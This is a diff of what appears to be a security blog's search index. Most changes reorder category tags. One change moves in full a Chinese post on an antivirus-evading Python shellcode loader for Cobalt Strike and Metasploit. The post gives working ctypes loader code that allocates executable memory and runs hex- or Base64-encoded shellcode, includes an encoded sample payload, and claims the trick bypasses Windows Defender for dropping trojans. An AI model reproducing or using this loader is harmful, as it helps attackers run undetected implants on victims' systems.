@@ -6526,11 +6526,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>内网渗透</category>
-        <category>编程</category>
         <category>信息收集</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -6698,8 +6698,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>内网渗透</category>
         <category>远程执行</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -8245,8 +8245,8 @@ Microsoft Windows 10 for 32-bit Systems 0
 
 <pre><code>&lt;a title=&quot;External url&quot; href=&quot;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&quot; target=&quot;_blank&quot;&gt;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&lt;/a&gt;&lt;/p&gt;</code></pre></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>工具</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -8483,6 +8483,120 @@ PortTranS.exe 8000 338
       <tags>
         <tag>Tool</tag>
         <tag>PortTran</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
+    <url>/p/f3512dbc.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
+<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
+<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
+<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
+<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
+<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
+<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
+<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
+<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
+<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
+<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
+<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
+<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
+<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
+<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
+<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
+<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
+<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
+<p>ScRunHex.py</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+#calc.exe
+#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
+shellcode=bytearray(sys.argv[1].decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
+</div>
+<pre class="brush:python;gutter:true;"></pre>
+<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
+<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
+<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun1.png"></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
+<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
+<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
+<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
+<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun2.png"></p>
+<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
+<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
+<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
+<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun3.png"></p>
+<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
+<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun4.png"></p>
+<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+import base64
+#calc.exe
+#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
+shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
+</div>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
+<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
+<p>&nbsp;</p>
+<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
+<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
+<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
+<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
+<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
+<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
+<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
+<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
+<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
+<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
+<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
+<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
+<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
+<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
+<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>免杀</category>
+        <category>Metasploit</category>
+        <category>Cobalt Strike</category>
+        <category>ShellCode</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
+        <tag>BypassAV</tag>
       </tags>
   </entry>
   <entry>
@@ -8783,8 +8897,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
 <p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>工具</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -8804,8 +8918,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>PowerShell</p>
 <p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>工具</category>
+        <category>提权</category>
         <category>密码</category>
         <category>PowerShell</category>
       </categories>
@@ -8881,8 +8995,8 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
 <p>&nbsp;</p>
 <p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
       <categories>
-        <category>提权</category>
         <category>工具</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -8954,132 +9068,18 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>内网渗透</category>
-        <category>编程</category>
         <category>嗅探</category>
         <category>信息收集</category>
+        <category>编程</category>
         <category>Python</category>
       </categories>
       <tags>
         <tag>Code</tag>
         <tag>Tool</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
-    <url>/p/f3512dbc.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
-<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
-<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
-<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
-<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
-<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
-<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
-<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
-<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
-<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
-<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
-<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
-<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
-<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
-<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
-<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
-<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
-<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
-<p>ScRunHex.py</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#scrun by k8gege
-import ctypes
-import sys
-#calc.exe
-#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
-shellcode=bytearray(sys.argv[1].decode("hex"))
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
-<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
-<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
-<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
-</div>
-<pre class="brush:python;gutter:true;"></pre>
-<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
-<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
-<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun1.png"></p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
-<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
-<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
-<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
-<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun2.png"></p>
-<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
-<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
-<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
-<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun3.png"></p>
-<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
-<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun4.png"></p>
-<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#scrun by k8gege
-import ctypes
-import sys
-import base64
-#calc.exe
-#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
-shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
-<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
-<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
-<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
-</div>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
-<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
-<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
-<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
-<p>&nbsp;</p>
-<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
-<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
-<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
-<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
-<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
-<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
-<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
-<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
-<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
-<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
-<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
-<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
-<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
-<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
-<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>免杀</category>
-        <category>Metasploit</category>
-        <category>Cobalt Strike</category>
-        <category>ShellCode</category>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
-        <tag>BypassAV</tag>
       </tags>
   </entry>
   <entry>
